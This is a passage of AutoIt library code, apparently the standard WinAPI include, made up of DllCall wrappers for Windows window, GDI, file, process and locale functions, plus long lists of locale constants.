	If @error OR NOT $aresult[0] Then Return SetError(@error + 20, @extended, 0)
	If $bretstring Then Return DllStructGetData($tout, 1)
	Return $tout
EndFunc

Func _winapi_multibytetowidecharex($stext, $ptext, $icodepage = 0, $iflags = 0)
	Local $aresult = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, "STR", $stext, "int", -1, "struct*", $ptext, "int", (StringLen($stext) + 1) * 2)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_openprocess($iaccess, $binherit, $ipid, $bdebugpriv = False)
	Local $aresult = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", $iaccess, "bool", $binherit, "dword", $ipid)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return $aresult[0]
	If NOT $bdebugpriv Then Return SetError(100, 0, 0)
	Local $htoken = _security__openthreadtokenex(BitOR($token_adjust_privileges, $token_query))
	If @error Then Return SetError(@error + 10, @extended, 0)
	_security__setprivilege($htoken, "SeDebugPrivilege", True)
	Local $ierror = @error
	Local $iextended = @extended
	Local $iret = 0
	If NOT @error Then
		$aresult = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", $iaccess, "bool", $binherit, "dword", $ipid)
		$ierror = @error
		$iextended = @extended
		If $aresult[0] Then $iret = $aresult[0]
		_security__setprivilege($htoken, "SeDebugPrivilege", False)
		If @error Then
			$ierror = @error + 20
			$iextended = @extended
		EndIf
	Else
		$ierror = @error + 30
	EndIf
	_winapi_closehandle($htoken)
	Return SetError($ierror, $iextended, $iret)
EndFunc

Func __winapi_parsefiledialogpath($spath)
	Local $afiles[3]
	$afiles[0] = 2
	Local $stemp = StringMid($spath, 1, StringInStr($spath, "\", 0, -1) - 1)
	$afiles[1] = $stemp
	$afiles[2] = StringMid($spath, StringInStr($spath, "\", 0, -1) + 1)
	Return $afiles
EndFunc

Func _winapi_pathfindonpath(Const $sfile, $aextrapaths = "", Const $spathdelimiter = @LF)
	Local $iextracount = 0
	If IsString($aextrapaths) Then
		If StringLen($aextrapaths) Then
			$aextrapaths = StringSplit($aextrapaths, $spathdelimiter, $str_entiresplit + $str_nocount)
			$iextracount = UBound($aextrapaths, $ubound_rows)
		EndIf
	ElseIf IsArray($aextrapaths) Then
		$iextracount = UBound($aextrapaths)
	EndIf
	Local $tpaths, $tpathptrs
	If $iextracount Then
		Local $tagstruct = ""
		For $path In $aextrapaths
			$tagstruct &= "wchar[" & StringLen($path) + 1 & "];"
		Next
		$tpaths = DllStructCreate($tagstruct)
		$tpathptrs = DllStructCreate("ptr[" & $iextracount + 1 & "]")
		For $i = 1 To $iextracount
			DllStructSetData($tpaths, $i, $aextrapaths[$i - 1])
			DllStructSetData($tpathptrs, 1, DllStructGetPtr($tpaths, $i), $i)
		Next
		DllStructSetData($tpathptrs, 1, Ptr(0), $iextracount + 1)
	EndIf
	Local $aresult = DllCall("shlwapi.dll", "bool", "PathFindOnPathW", "wstr", $sfile, "struct*", $tpathptrs)
	If @error OR NOT $aresult[0] Then Return SetError(@error + 10, @extended, $sfile)
	Return $aresult[1]
EndFunc

Func _winapi_pointfromrect(ByRef $trect, $bcenter = True)
	Local $ix1 = DllStructGetData($trect, "Left")
	Local $iy1 = DllStructGetData($trect, "Top")
	Local $ix2 = DllStructGetData($trect, "Right")
	Local $iy2 = DllStructGetData($trect, "Bottom")
	If $bcenter Then
		$ix1 = $ix1 + (($ix2 - $ix1) / 2)
		$iy1 = $iy1 + (($iy2 - $iy1) / 2)
	EndIf
	Local $tpoint = DllStructCreate($tagpoint)
	DllStructSetData($tpoint, "X", $ix1)
	DllStructSetData($tpoint, "Y", $iy1)
	Return $tpoint
EndFunc

Func _winapi_postmessage($hwnd, $imsg, $iwparam, $ilparam)
	Local $aresult = DllCall("user32.dll", "bool", "PostMessage", "hwnd", $hwnd, "uint", $imsg, "wparam", $iwparam, "lparam", $ilparam)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_primarylangid($ilgid)
	Return BitAND($ilgid, 1023)
EndFunc

Func _winapi_ptinrect(ByRef $trect, ByRef $tpoint)
	Local $aresult = DllCall("user32.dll", "bool", "PtInRect", "struct*", $trect, "struct", $tpoint)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_readfile($hfile, $pbuffer, $itoread, ByRef $iread, $poverlapped = 0)
	Local $aresult = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "ptr", $pbuffer, "dword", $itoread, "dword*", 0, "ptr", $poverlapped)
	If @error Then Return SetError(@error, @extended, False)
	$iread = $aresult[4]
	Return $aresult[0]
EndFunc

Func _winapi_readprocessmemory($hprocess, $pbaseaddress, $pbuffer, $isize, ByRef $iread)
	Local $aresult = DllCall("kernel32.dll", "bool", "ReadProcessMemory", "handle", $hprocess, "ptr", $pbaseaddress, "ptr", $pbuffer, "ulong_ptr", $isize, "ulong_ptr*", 0)
	If @error Then Return SetError(@error, @extended, False)
	$iread = $aresult[5]
	Return $aresult[0]
EndFunc

Func _winapi_rectisempty(ByRef $trect)
	Return (DllStructGetData($trect, "Left") = 0) AND (DllStructGetData($trect, "Top") = 0) AND (DllStructGetData($trect, "Right") = 0) AND (DllStructGetData($trect, "Bottom") = 0)
EndFunc

Func _winapi_redrawwindow($hwnd, $trect = 0, $hregion = 0, $iflags = 5)
	Local $aresult = DllCall("user32.dll", "bool", "RedrawWindow", "hwnd", $hwnd, "struct*", $trect, "handle", $hregion, "uint", $iflags)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_registerwindowmessage($smessage)
	Local $aresult = DllCall("user32.dll", "uint", "RegisterWindowMessageW", "wstr", $smessage)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_releasecapture()
	Local $aresult = DllCall("user32.dll", "bool", "ReleaseCapture")
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_releasedc($hwnd, $hdc)
	Local $aresult = DllCall("user32.dll", "int", "ReleaseDC", "hwnd", $hwnd, "handle", $hdc)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_screentoclient($hwnd, ByRef $tpoint)
	Local $aresult = DllCall("user32.dll", "bool", "ScreenToClient", "hwnd", $hwnd, "struct*", $tpoint)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_selectobject($hdc, $hgdiobj)
	Local $aresult = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdc, "handle", $hgdiobj)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_setbkcolor($hdc, $icolor)
	Local $aresult = DllCall("gdi32.dll", "INT", "SetBkColor", "handle", $hdc, "INT", $icolor)
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc

Func _winapi_setbkmode($hdc, $ibkmode)
	Local $aresult = DllCall("gdi32.dll", "int", "SetBkMode", "handle", $hdc, "int", $ibkmode)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_setcapture($hwnd)
	Local $aresult = DllCall("user32.dll", "hwnd", "SetCapture", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_setcursor($hcursor)
	Local $aresult = DllCall("user32.dll", "handle", "SetCursor", "handle", $hcursor)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_setdefaultprinter($sprinter)
	Local $aresult = DllCall("winspool.drv", "bool", "SetDefaultPrinterW", "wstr", $sprinter)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_setdibits($hdc, $hbmp, $istartscan, $iscanlines, $pbits, $pbmi, $icoloruse = 0)
	Local $aresult = DllCall("gdi32.dll", "int", "SetDIBits", "handle", $hdc, "handle", $hbmp, "uint", $istartscan, "uint", $iscanlines, "ptr", $pbits, "ptr", $pbmi, "INT", $icoloruse)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_setendoffile($hfile)
	Local $aresult = DllCall("kernel32.dll", "bool", "SetEndOfFile", "handle", $hfile)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_setevent($hevent)
	Local $aresult = DllCall("kernel32.dll", "bool", "SetEvent", "handle", $hevent)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_setfilepointer($hfile, $ipos, $imethod = 0)
	Local $aresult = DllCall("kernel32.dll", "INT", "SetFilePointer", "handle", $hfile, "long", $ipos, "ptr", 0, "long", $imethod)
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc

Func _winapi_setfocus($hwnd)
	Local $aresult = DllCall("user32.dll", "hwnd", "SetFocus", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_setfont($hwnd, $hfont, $bredraw = True)
	_sendmessage($hwnd, $__winapiconstant_wm_setfont, $hfont, $bredraw, 0, "hwnd")
EndFunc

Func _winapi_sethandleinformation($hobject, $imask, $iflags)
	Local $aresult = DllCall("kernel32.dll", "bool", "SetHandleInformation", "handle", $hobject, "dword", $imask, "dword", $iflags)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_setlayeredwindowattributes($hwnd, $itranscolor, $itransgui = 255, $iflags = 3, $bcolorref = False)
	If $iflags = Default OR $iflags = "" OR $iflags < 0 Then $iflags = 3
	If NOT $bcolorref Then
		$itranscolor = Int(BinaryMid($itranscolor, 3, 1) & BinaryMid($itranscolor, 2, 1) & BinaryMid($itranscolor, 1, 1))
	EndIf
	Local $aresult = DllCall("user32.dll", "bool", "SetLayeredWindowAttributes", "hwnd", $hwnd, "INT", $itranscolor, "byte", $itransgui, "dword", $iflags)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_setparent($hwndchild, $hwndparent)
	Local $aresult = DllCall("user32.dll", "hwnd", "SetParent", "hwnd", $hwndchild, "hwnd", $hwndparent)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_setprocessaffinitymask($hprocess, $imask)
	Local $aresult = DllCall("kernel32.dll", "bool", "SetProcessAffinityMask", "handle", $hprocess, "ulong_ptr", $imask)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_setsyscolors($velements, $vcolors)
	Local $bisearray = IsArray($velements), $biscarray = IsArray($vcolors)
	Local $ielementnum
	If NOT $biscarray AND NOT $bisearray Then
		$ielementnum = 1
	ElseIf $biscarray OR $bisearray Then
		If NOT $biscarray OR NOT $bisearray Then Return SetError(-1, -1, False)
		If UBound($velements) <> UBound($vcolors) Then Return SetError(-1, -1, False)
		$ielementnum = UBound($velements)
	EndIf
	Local $telements = DllStructCreate("int Element[" & $ielementnum & "]")
	Local $tcolors = DllStructCreate("INT NewColor[" & $ielementnum & "]")
	If NOT $bisearray Then
		DllStructSetData($telements, "Element", $velements, 1)
	Else
		For $x = 0 To $ielementnum - 1
			DllStructSetData($telements, "Element", $velements[$x], $x + 1)
		Next
	EndIf
	If NOT $biscarray Then
		DllStructSetData($tcolors, "NewColor", $vcolors, 1)
	Else
		For $x = 0 To $ielementnum - 1
			DllStructSetData($tcolors, "NewColor", $vcolors[$x], $x + 1)
		Next
	EndIf
	Local $aresult = DllCall("user32.dll", "bool", "SetSysColors", "int", $ielementnum, "struct*", $telements, "struct*", $tcolors)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_settextcolor($hdc, $icolor)
	Local $aresult = DllCall("gdi32.dll", "INT", "SetTextColor", "handle", $hdc, "INT", $icolor)
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc

Func _winapi_setwindowlong($hwnd, $iindex, $ivalue)
	_winapi_setlasterror(0)
	Local $sfuncname = "SetWindowLongW"
	If @AutoItX64 Then $sfuncname = "SetWindowLongPtrW"
	Local $aresult = DllCall("user32.dll", "long_ptr", $sfuncname, "hwnd", $hwnd, "int", $iindex, "long_ptr", $ivalue)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_setwindowplacement($hwnd, $pwindowplacement)
	Local $aresult = DllCall("user32.dll", "bool", "SetWindowPlacement", "hwnd", $hwnd, "ptr", $pwindowplacement)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_setwindowpos($hwnd, $hafter, $ix, $iy, $icx, $icy, $iflags)
	Local $aresult = DllCall("user32.dll", "bool", "SetWindowPos", "hwnd", $hwnd, "hwnd", $hafter, "int", $ix, "int", $iy, "int", $icx, "int", $icy, "uint", $iflags)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_setwindowrgn($hwnd, $hrgn, $bredraw = True)
	Local $aresult = DllCall("user32.dll", "int", "SetWindowRgn", "hwnd", $hwnd, "handle", $hrgn, "bool", $bredraw)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_setwindowshookex($idhook, $pfn, $hmod, $ithreadid = 0)
	Local $aresult = DllCall("user32.dll", "handle", "SetWindowsHookEx", "int", $idhook, "ptr", $pfn, "handle", $hmod, "dword", $ithreadid)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_setwindowtext($hwnd, $stext)
	Local $aresult = DllCall("user32.dll", "bool", "SetWindowTextW", "hwnd", $hwnd, "wstr", $stext)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_showcursor($bshow)
	Local $aresult = DllCall("user32.dll", "int", "ShowCursor", "bool", $bshow)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_showerror($stext, $bexit = True)
	_winapi_msgbox($mb_systemmodal, "Error", $stext)
	If $bexit Then Exit
EndFunc

Func _winapi_showmsg($stext)
	_winapi_msgbox($mb_systemmodal, "Information", $stext)
EndFunc

Func _winapi_showwindow($hwnd, $icmdshow = 5)
	Local $aresult = DllCall("user32.dll", "bool", "ShowWindow", "hwnd", $hwnd, "int", $icmdshow)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_stringfromguid($pguid)
	Local $aresult = DllCall("ole32.dll", "int", "StringFromGUID2", "struct*", $pguid, "wstr", "", "int", 40)
	If @error OR NOT $aresult[0] Then Return SetError(@error, @extended, "")
	Return SetExtended($aresult[0], $aresult[2])
EndFunc

Func _winapi_stringlena(Const ByRef $tstring)
	Local $aresult = DllCall("kernel32.dll", "int", "lstrlenA", "struct*", $tstring)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_stringlenw(Const ByRef $tstring)
	Local $aresult = DllCall("kernel32.dll", "int", "lstrlenW", "struct*", $tstring)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_sublangid($ilgid)
	Return BitShift($ilgid, 10)
EndFunc

Func _winapi_systemparametersinfo($iaction, $iparam = 0, $vparam = 0, $iwinini = 0)
	Local $aresult = DllCall("user32.dll", "bool", "SystemParametersInfoW", "uint", $iaction, "uint", $iparam, "ptr", $vparam, "uint", $iwinini)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_twipsperpixelx()
	Local $hdc, $itwipsperpixelx
	$hdc = _winapi_getdc(0)
	$itwipsperpixelx = 1440 / _winapi_getdevicecaps($hdc, $__winapiconstant_logpixelsx)
	_winapi_releasedc(0, $hdc)
	Return $itwipsperpixelx
EndFunc

Func _winapi_twipsperpixely()
	Local $hdc, $itwipsperpixely
	$hdc = _winapi_getdc(0)
	$itwipsperpixely = 1440 / _winapi_getdevicecaps($hdc, $__winapiconstant_logpixelsy)
	_winapi_releasedc(0, $hdc)
	Return $itwipsperpixely
EndFunc

Func _winapi_unhookwindowshookex($hhk)
	Local $aresult = DllCall("user32.dll", "bool", "UnhookWindowsHookEx", "handle", $hhk)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_updatelayeredwindow($hwnd, $hdcdest, $pptdest, $psize, $hdcsrce, $pptsrce, $irgb, $pblend, $iflags)
	Local $aresult = DllCall("user32.dll", "bool", "UpdateLayeredWindow", "hwnd", $hwnd, "handle", $hdcdest, "ptr", $pptdest, "ptr", $psize, "handle", $hdcsrce, "ptr", $pptsrce, "dword", $irgb, "ptr", $pblend, "dword", $iflags)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_updatewindow($hwnd)
	Local $aresult = DllCall("user32.dll", "bool", "UpdateWindow", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_waitforinputidle($hprocess, $itimeout = -1)
	Local $aresult = DllCall("user32.dll", "dword", "WaitForInputIdle", "handle", $hprocess, "dword", $itimeout)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_waitformultipleobjects($icount, $phandles, $bwaitall = False, $itimeout = -1)
	Local $aresult = DllCall("kernel32.dll", "INT", "WaitForMultipleObjects", "dword", $icount, "ptr", $phandles, "bool", $bwaitall, "dword", $itimeout)
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc

Func _winapi_waitforsingleobject($hhandle, $itimeout = -1)
	Local $aresult = DllCall("kernel32.dll", "INT", "WaitForSingleObject", "handle", $hhandle, "dword", $itimeout)
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc

Func _winapi_widechartomultibyte($punicode, $icodepage = 0, $bretstring = True)
	Local $sunicodetype = "wstr"
	If NOT IsString($punicode) Then $sunicodetype = "struct*"
	Local $aresult = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "uint", $icodepage, "dword", 0, $sunicodetype, $punicode, "int", -1, "ptr", 0, "int", 0, "ptr", 0, "ptr", 0)
	If @error OR NOT $aresult[0] Then Return SetError(@error + 20, @extended, "")
	Local $tmultibyte = DllStructCreate("char[" & $aresult[0] & "]")
	$aresult = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "uint", $icodepage, "dword", 0, $sunicodetype, $punicode, "int", -1, "struct*", $tmultibyte, "int", $aresult[0], "ptr", 0, "ptr", 0)
	If @error OR NOT $aresult[0] Then Return SetError(@error + 10, @extended, "")
	If $bretstring Then Return DllStructGetData($tmultibyte, 1)
	Return $tmultibyte
EndFunc

Func _winapi_windowfrompoint(ByRef $tpoint)
	Local $aresult = DllCall("user32.dll", "hwnd", "WindowFromPoint", "struct", $tpoint)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_writeconsole($hconsole, $stext)
	Local $aresult = DllCall("kernel32.dll", "bool", "WriteConsoleW", "handle", $hconsole, "wstr", $stext, "dword", StringLen($stext), "dword*", 0, "ptr", 0)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_writefile($hfile, $pbuffer, $itowrite, ByRef $iwritten, $poverlapped = 0)
	Local $aresult = DllCall("kernel32.dll", "bool", "WriteFile", "handle", $hfile, "ptr", $pbuffer, "dword", $itowrite, "dword*", 0, "ptr", $poverlapped)
	If @error Then Return SetError(@error, @extended, False)
	$iwritten = $aresult[4]
	Return $aresult[0]
EndFunc

Func _winapi_writeprocessmemory($hprocess, $pbaseaddress, $pbuffer, $isize, ByRef $iwritten, $sbuffer = "ptr")
	Local $aresult = DllCall("kernel32.dll", "bool", "WriteProcessMemory", "handle", $hprocess, "ptr", $pbaseaddress, $sbuffer, $pbuffer, "ulong_ptr", $isize, "ulong_ptr*", 0)
	If @error Then Return SetError(@error, @extended, False)
	$iwritten = $aresult[5]
	Return $aresult[0]
EndFunc

Global Const $linguistic_ignorecase = 16
Global Const $linguistic_ignorediacritic = 32
Global Const $norm_ignorecase = 1
Global Const $norm_ignorekanatype = 65536
Global Const $norm_ignorenonspace = 2
Global Const $norm_ignoresymbols = 4
Global Const $norm_ignorewidth = 131072
Global Const $norm_linguistic_casing = 134217728
Global Const $sort_digitsasnumbers = 8
Global Const $sort_stringsort = 4096
Global Const $cstr_less_than = 1
Global Const $cstr_equal = 2
Global Const $cstr_greater_than = 3
Global Const $mui_language_id = 4
Global Const $mui_language_name = 8
Global Const $date_autolayout = 64
Global Const $date_longdate = 2
Global Const $date_ltrreading = 16
Global Const $date_shortdate = 1
Global Const $date_rtlreading = 32
Global Const $date_use_alt_calendar = 4
Global Const $date_yearmonth = 8
Global Const $geo_nation = 1
Global Const $geo_latitude = 2
Global Const $geo_longitude = 3
Global Const $geo_iso2 = 4
Global Const $geo_iso3 = 5
Global Const $geo_rfc1766 = 6
Global Const $geo_lcid = 7
Global Const $geo_friendlyname = 8
Global Const $geo_officialname = 9
Global Const $geo_timezones = 10
Global Const $geo_officiallanguages = 11
Global Const $geo_iso_un_number = 12
Global Const $geo_parent = 13
Global Const $locale_ilanguage = 1
Global Const $locale_slanguage = 2
Global Const $locale_senglanguage = 4097
Global Const $locale_sabbrevlangname = 3
Global Const $locale_snativelangname = 4
Global Const $locale_icountry = 5
Global Const $locale_scountry = 6
Global Const $locale_sengcountry = 4098
Global Const $locale_sabbrevctryname = 7
Global Const $locale_snativectryname = 8
Global Const $locale_idefaultlanguage = 9
Global Const $locale_idefaultcountry = 10
Global Const $locale_idefaultcodepage = 11
Global Const $locale_idefaultansicodepage = 4100
Global Const $locale_idefaultmaccodepage = 4113
Global Const $locale_slist = 12
Global Const $locale_imeasure = 13
Global Const $locale_sdecimal = 14
Global Const $locale_sthousand = 15
Global Const $locale_sgrouping = 16
Global Const $locale_idigits = 17
Global Const $locale_ilzero = 18
Global Const $locale_inegnumber = 4112
Global Const $locale_snativedigits = 19
Global Const $locale_scurrency = 20
Global Const $locale_sintlsymbol = 21
Global Const $locale_smondecimalsep = 22
Global Const $locale_smonthousandsep = 23
Global Const $locale_smongrouping = 24
Global Const $locale_icurrdigits = 25
Global Const $locale_iintlcurrdigits = 26
Global Const $locale_icurrency = 27
Global Const $locale_inegcurr = 28
Global Const $locale_sdate = 29
Global Const $locale_stime = 30
Global Const $locale_sshortdate = 31
Global Const $locale_slongdate = 32
Global Const $locale_stimeformat = 4099
Global Const $locale_idate = 33
Global Const $locale_ildate = 34
Global Const $locale_itime = 35
Global Const $locale_itimemarkposn = 4101
Global Const $locale_icentury = 36
Global Const $locale_itlzero = 37
Global Const $locale_idaylzero = 38
Global Const $locale_imonlzero = 39
Global Const $locale_s1159 = 40
Global Const $locale_s2359 = 41
Global Const $locale_icalendartype = 4105
Global Const $locale_ioptionalcalendar = 4107
Global Const $locale_ifirstdayofweek = 4108
Global Const $locale_ifirstweekofyear = 4109
Global Const $locale_sdayname1 = 42
Global Const $locale_sdayname2 = 43
Global Const $locale_sdayname3 = 44
Global Const $locale_sdayname4 = 45
Global Const $locale_sdayname5 = 46
Global Const $locale_sdayname6 = 47
Global Const $locale_sdayname7 = 48
Global Const $locale_sabbrevdayname1 = 49
Global Const $locale_sabbrevdayname2 = 50
Global Const $locale_sabbrevdayname3 = 51
Global Const $locale_sabbrevdayname4 = 52
Global Const $locale_sabbrevdayname5 = 53
Global Const $locale_sabbrevdayname6 = 54
Global Const $locale_sabbrevdayname7 = 55
Global Const $locale_smonthname1 = 56
Global Const $locale_smonthname2 = 57
Global Const $locale_smonthname3 = 58
Global Const $locale_smonthname4 = 59
Global Const $locale_smonthname5 = 60
Global Const $locale_smonthname6 = 61
Global Const $locale_smonthname7 = 62
Global Const $locale_smonthname8 = 63
Global Const $locale_smonthname9 = 64
Global Const $locale_smonthname10 = 65
Global Const $locale_smonthname11 = 66
Global Const $locale_smonthname12 = 67
Global Const $locale_smonthname13 = 4110
Global Const $locale_sabbrevmonthname1 = 68
Global Const $locale_sabbrevmonthname2 = 69
Global Const $locale_sabbrevmonthname3 = 70
Global Const $locale_sabbrevmonthname4 = 71
Global Const $locale_sabbrevmonthname5 = 72
Global Const $locale_sabbrevmonthname6 = 73
Global Const $locale_sabbrevmonthname7 = 74
Global Const $locale_sabbrevmonthname8 = 75
Global Const $locale_sabbrevmonthname9 = 76
Global Const $locale_sabbrevmonthname10 = 77
Global Const $locale_sabbrevmonthname11 = 78
Global Const $locale_sabbrevmonthname12 = 79
Global Const $locale_sabbrevmonthname13 = 4111
Global Const $locale_spositivesign = 80
Global Const $locale_snegativesign = 81
Global Const $locale_ipossignposn = 82
Global Const $locale_inegsignposn = 83
Global Const $locale_ipossymprecedes = 84
Global Const $locale_ipossepbyspace = 85
Global Const $locale_inegsymprecedes = 86
Global Const $locale_inegsepbyspace = 87
Global Const $locale_fontsignature = 88
Global Const $locale_siso639langname = 89
Global Const $locale_siso3166ctryname = 90
Global Const $locale_idefaultebcdiccodepage = 4114
Global Const $locale_ipapersize = 4106
Global Const $locale_sengcurrname = 4103
Global Const $locale_snativecurrname = 4104
Global Const $locale_syearmonth = 4102
Global Const $locale_ssortname = 4115
Global Const $locale_idigitsubstitution = 4116
Global Const $locale_custom_default = 3072
Global Const $locale_custom_ui_default = 5120
Global Const $locale_custom_unspecified = 4096
Global Const $locale_invariant = 127
Global Const $locale_system_default = 2048
Global Const $locale_user_default = 1024
Global Const $time_force24hourformat = 8
Global Const $time_nominutesorseconds = 1
Global Const $time_noseconds = 2
Global Const $time_notimemarker = 4
Global Const $lcid_installed = 1
Global Const $lcid_supported = 2
#Region Global Variables and Constants
	Global $__g_venum, $__g_vext = 0
	Global $__g_hheap = 0, $__g_irgbmode = 1
	Global Const $tagosversioninfo = "struct;dword OSVersionInfoSize;dword MajorVersion;dword MinorVersion;dword BuildNumber;dword PlatformId;wchar CSDVersion[128];endstruct"
	Global Const $__winver = __winver()
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions

	Func _winapi_arraytostruct(Const ByRef $adata, $istart = 0, $iend = -1)
		If __checkerrorarraybounds($adata, $istart, $iend) Then Return SetError(@error + 10, @extended, 0)
		Local $tagstruct = ""
		For $i = $istart To $iend
			$tagstruct &= "wchar[" & (StringLen($adata[$i]) + 1) & "];"
		Next
		Local $tdata = DllStructCreate($tagstruct & "wchar[1]")
		Local $icount = 1
		For $i = $istart To $iend
			DllStructSetData($tdata, $icount, $adata[$i])
			$icount += 1
		Next
		DllStructSetData($tdata, $icount, ChrW(0))
		Return $tdata
	EndFunc

	Func _winapi_createmargins($ileftwidth, $irightwidth, $itopheight, $ibottomheight)
		Local $tmargins = DllStructCreate($tagmargins)
		DllStructSetData($tmargins, 1, $ileftwidth)
		DllStructSetData($tmargins, 2, $irightwidth)
		DllStructSetData($tmargins, 3, $itopheight)
		DllStructSetData($tmargins, 4, $ibottomheight)
		Return $tmargins
	EndFunc

	Func _winapi_createpoint($ix, $iy)
		Local $tpoint = DllStructCreate($tagpoint)
		DllStructSetData($tpoint, 1, $ix)
		DllStructSetData($tpoint, 2, $iy)
		Return $tpoint
	EndFunc

	Func _winapi_createrect($ileft, $itop, $iright, $ibottom)
		Local $trect = DllStructCreate($tagrect)
		DllStructSetData($trect, 1, $ileft)
		DllStructSetData($trect, 2, $itop)
		DllStructSetData($trect, 3, $iright)
		DllStructSetData($trect, 4, $ibottom)
		Return $trect
	EndFunc

	Func _winapi_createrectex($ix, $iy, $iwidth, $iheight)
		Local $trect = DllStructCreate($tagrect)
		DllStructSetData($trect, 1, $ix)
		DllStructSetData($trect, 2, $iy)
		DllStructSetData($trect, 3, $ix + $iwidth)
		DllStructSetData($trect, 4, $iy + $iheight)
		Return $trect
	EndFunc

	Func _winapi_createsize($iwidth, $iheight)
		Local $tsize = DllStructCreate($tagsize)
		DllStructSetData($tsize, 1, $iwidth)
		DllStructSetData($tsize, 2, $iheight)
		Return $tsize
	EndFunc

	Func _winapi_fatalexit($icode)
		DllCall("kernel32.dll", "none", "FatalExit", "int", $icode)
		If @error Then Return SetError(@error, @extended)
	EndFunc

	Func _winapi_getbitmapdimension($hbitmap)
		Local Const $tagbitmap = "struct;long bmType;long bmWidth;long bmHeight;long bmWidthBytes;ushort bmPlanes;ushort bmBitsPixel;ptr bmBits;endstruct"
		Local $tobj = DllStructCreate($tagbitmap)
		Local $aret = DllCall("gdi32.dll", "int", "GetObject", "handle", $hbitmap, "int", DllStructGetSize($tobj), "struct*", $tobj)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return _winapi_createsize(DllStructGetData($tobj, "bmWidth"), DllStructGetData($tobj, "bmHeight"))
	EndFunc

	Func _winapi_getstring($pstring, $bunicode = True)
		Local $ilength = _winapi_strlen($pstring, $bunicode)
		If @error OR NOT $ilength Then Return SetError(@error + 10, @extended, "")
		Local $tstring = DllStructCreate(__iif($bunicode, "wchar", "char") & "[" & ($ilength + 1) & "]", $pstring)
		If @error Then Return SetError(@error, @extended, "")
		Return SetExtended($ilength, DllStructGetData($tstring, 1))
	EndFunc

	Func _winapi_isbadreadptr($paddress, $ilength)
		Local $aret = DllCall("kernel32.dll", "bool", "IsBadReadPtr", "ptr", $paddress, "uint_ptr", $ilength)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_isbadwriteptr($paddress, $ilength)
		Local $aret = DllCall("kernel32.dll", "bool", "IsBadWritePtr", "ptr", $paddress, "uint_ptr", $ilength)
